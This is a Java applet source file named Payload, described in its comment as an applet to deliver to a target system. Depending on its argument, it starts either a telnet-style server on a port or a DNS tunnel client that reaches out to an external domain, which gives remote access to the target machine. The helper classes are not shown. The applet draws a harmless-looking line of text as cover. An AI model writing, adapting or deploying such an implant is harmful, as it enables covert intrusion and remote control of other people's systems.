
import java.applet.Applet;
import java.awt.Graphics;

/**
 * An applet to deliver to target system.
 */
public class Payload extends Applet {

    private enum Mode {
        SERVER, DNS_TUNNEL_CLIENT
    }

    private int port = 34567;
    private String domain = null;
    private Mode mode = Mode.DNS_TUNNEL_CLIENT;

	public Payload() {
		this( "TODO.a.blky.eu" );
	}
    /**
	 * @param string
	 */
	public Payload(String dPar) {
		domain= dPar;
		mode = Mode.DNS_TUNNEL_CLIENT;
		System.out.println("// start a server via DNS tunnel over ["+dPar+"]");
	}
	/**
	 * 
	 * @param portPar
	 */
	public Payload(long portPar) {
		mode = Mode.SERVER;
		port = (int) portPar;
		System.out.println("// start a simple telnet server:"+portPar);
	}	

	public static void main(String[] args) {
		Payload payload;
		if (args.length==1) {
			try {
				payload = new Payload(Long.parseLong(args[0]));
			}catch(Exception e) {
				payload = new Payload(args[0]);
			}
			payload.start();
		}else {
			System.out.println("USE:>java Payload DOMAIN|PORT");
		}
		
    }

    @Override
    public void start() {
        switch (mode) {
            case SERVER:
                // start a simple telnet server
                Server.start(port);
                break;
            case DNS_TUNNEL_CLIENT:
                // start a server via DNS tunnel
                DNSTunnelClient.start(domain==null?this.getParameter("domain"):domain);
                break;
            default:
                throw new RuntimeException("Unknown mode: " + mode);
        }
    }

    @Override
    public void paint(Graphics g) {
        g.drawString("Like most of life's problems, "
                + "this one can be solved with bending", 40, 20);
    }
 

}
